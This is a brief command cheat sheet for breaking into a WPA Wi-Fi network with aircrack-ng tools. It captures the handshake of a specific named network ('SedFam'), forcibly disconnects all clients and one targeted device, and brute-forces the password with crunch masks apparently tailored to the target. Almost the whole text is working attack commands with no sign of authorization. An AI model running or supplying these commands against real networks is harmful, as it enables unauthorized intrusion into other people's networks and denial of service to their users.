/******************WireLess*********************/
ifconfig
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
airmon-ng check wlan0 //kill all resalts shown in command above //
airodump-ng wlan0 //scans everyone connected to thet network//

airodump-ng -c 8 --bssid 74:DA:DA:16:05:90 -w sedfam_scan wlan0  //scans every traffic of the mac spcified, we run untill we see "WPA handshake: 74:DA:DA:16:05:90" messege //
aireplay-ng -0 0 -a 74:DA:DA:16:05:90 wlan0   //disconnects everyone from the network//
aireplay-ng -0 0 -a 74:DA:DA:16:05:90 wlan0 -c EE:99:DB:98:D0:CA //blocks the mac after -c in the network //

crunch 12 12 -t ,@@@@@@^%%%%  012345aedomfr | aircrack-ng -w - sedfam_scan-01.cap -e SedFam
crunch 12 12 -t Freedom^%%%% 02 | aircrack-ng -w - sedfam_scan-01.cap -e SedFam

